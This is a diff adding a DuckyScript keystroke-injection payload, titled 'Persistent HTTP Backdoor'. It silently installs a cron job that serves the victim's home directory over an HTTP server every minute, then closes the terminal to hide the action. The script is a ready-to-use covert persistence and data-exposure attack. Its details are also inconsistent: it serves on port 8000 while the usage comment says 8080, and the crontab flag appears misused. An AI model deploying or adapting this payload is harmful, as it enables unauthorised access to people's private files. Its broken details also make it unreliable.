@@ -1,0 +1,19 @@
+REM Title: Persistent HTTP Backdoor (Python3)
+REM Author: UndedInside
+REM Description: Hosts the victim's filetree on an HTTP server using the builtin Python3 module
+
+REM Open new terminal window
+DEFAULT_DELAY 400
+ALT t
+
+REM Create backdoor
+STRING echo "* * * * * cd ~ && python3 -m http.server 8000" > cron
+ENTER
+STRING crontab -i cron
+ENTER
+
+REM Close window to run stealthily
+ALT F4
+
+REM You can now interact with this by navigating to http://[Victim IP]:8080 in a browser
+REM or curl [Victim IP]:8080
